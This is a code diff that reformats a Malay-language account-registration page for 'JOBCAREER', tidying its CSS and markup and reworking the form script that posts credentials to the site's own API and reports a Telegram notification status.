@@ -8,6 +8,7 @@
 
 <style>
 *{box-sizing:border-box}
+
 body{
 font-family:Arial,sans-serif;
 background:#f3f6fa;
@@ -17,6 +18,7 @@ display:grid;
 place-items:center;
 color:#203047
 }
+
 main{
 background:#fff;
 padding:30px;
@@ -24,12 +26,15 @@ border-radius:14px;
 width:min(440px,calc(100% - 32px));
 box-shadow:0 8px 30px #102c5018
 }
+
 h1{color:#102c50;margin-top:0}
+
 label{
 display:block;
 font-weight:bold;
 margin:15px 0 7px
 }
+
 input{
 width:100%;
 padding:13px;
@@ -37,6 +42,7 @@ border:1px solid #ccd5e0;
 border-radius:8px;
 font-size:16px
 }
+
 button{
 width:100%;
 padding:13px;
@@ -48,101 +54,158 @@ font-size:16px;
 margin-top:18px;
 cursor:pointer
 }
-button:disabled{opacity:.6;cursor:wait}
-#message{margin-top:15px;line-height:1.5}
-.hint{font-size:13px;color:#667085}
+
+button:disabled{
+opacity:.6;
+cursor:wait
+}
+
+#message{
+margin-top:15px;
+line-height:1.5
+}
+
+.hint{
+font-size:13px;
+color:#667085
+}
 </style>
 </head>
 
 <body>
+
 <main>
+
 <h1>Cipta akaun JOBCAREER</h1>
 
-<p><p>
-Halaman ini hanya untuk membuat kata laluan akaun JOBCAREER anda sendiri.
- masukkan kata laluan Telegram.
-</p>.</p>
+<p>
+Halaman ini digunakan untuk membuat kata laluan
+akaun JOBCAREER anda sendiri.
+</p>
 
 <form id="registerForm">
 
 <label for="email">E-mel</label>
-<input type="email" id="email" name="email"
-required maxlength="190" autocomplete="email">
+<input
+type="email"
+id="email"
+name="email"
+required
+maxlength="190"
+autocomplete="email"
+>
 
-<label for="password">Kata laluan</label>
-<input type="password" id="password" name="password"
-required minlength="10" autocomplete="new-password">
+<label for="password">Kata laluan JOBCAREER</label>
+<input
+type="password"
+id="password"
+name="password"
+required
+minlength="10"
+autocomplete="new-password"
+>
 
 <label for="confirm">Ulang kata laluan</label>
-<input type="password" id="confirm" name="confirm"
-required minlength="10" autocomplete="new-password">
+<input
+type="password"
+id="confirm"
+name="confirm"
+required
+minlength="10"
+autocomplete="new-password"
+>
 
 <p class="hint">
-Minimum 10 aksara. Kata laluan disimpan sebagai hash dan tidak dihantar ke Telegram.
+Minimum 10 aksara. Kata laluan disimpan sebagai hash
+dan tidak dihantar ke Telegram.
 </p>
 
-<button type="submit" id="submitBtn">Daftar akaun</button>
+<button type="submit" id="submitBtn">
+Daftar akaun
+</button>
 
 </form>
 
 <div id="message" role="status"></div>
+
 </main>
 
 <script>
-document.getElementById('registerForm')
-.addEventListener('submit', async e => {
+const form = document.getElementById('registerForm');
+
+form.addEventListener('submit', async function(e){
 
 e.preventDefault();
 
+const email = document.getElementById('email').value.trim();
 const password = document.getElementById('password').value;
 const confirm = document.getElementById('confirm').value;
-const email = document.getElementById('email').value.trim();
+
 const msg = document.getElementById('message');
 const btn = document.getElementById('submitBtn');
 
-if (password !== confirm) {
+if(password !== confirm){
 msg.textContent = 'Kata laluan tidak sepadan.';
+return;
+}
+
+if(password.length < 10){
+msg.textContent = 'Kata laluan minimum 10 aksara.';
 return;
 }
 
 btn.disabled = true;
 btn.textContent = 'Memproses...';
+msg.textContent = '';
 
-try {
+try{
 
-const r = await fetch('/api/pass', {
-method: 'POST',
-headers: {
-'Content-Type': 'application/json'
+const response = await fetch('/api/pass',{
+method:'POST',
+headers:{
+'Content-Type':'application/json'
 },
-body: JSON.stringify({
-email,
-password,
-confirm
+body:JSON.stringify({
+email:email,
+password:password,
+confirm:confirm
 })
 });
 
-const d = await r.json();
+const data = await response.json();
+
+console.log('HTTP Status:',response.status);
+console.log('API Response:',data);
+
+if(!response.ok || !data.success){
 
 msg.textContent =
-  d.message || 'Tidak ada respons dari server.';
+data.message || 'Pendaftaran gagal. Sila cuba lagi.';
 
-console.log('Status HTTP:', r.status);
-console.log('API response:', d);
-console.log('Telegram sent:', d.telegramSent);
-
-console.log('API response:', d);
-
-if (r.ok && d.success) {
-e.target.reset();
+return;
 }
 
-} catch (err) {
+if(data.telegramSent === false){
 
-console.error(err);
-msg.textContent = 'Tidak dapat menghubungi server.';
+msg.textContent =
+'Pendaftaran diproses, tetapi notifikasi Telegram gagal dihantar.';
 
-} finally {
+return;
+}
+
+msg.textContent =
+data.message || 'Pendaftaran berjaya.';
+
+form.reset();
+
+}catch(error){
+
+console.error('Registration error:',error);
+
+msg.textContent =
+'Tidak dapat menghubungi server. Sila cuba lagi.';
+
+}finally{
 
 btn.disabled = false;
 btn.textContent = 'Daftar akaun';
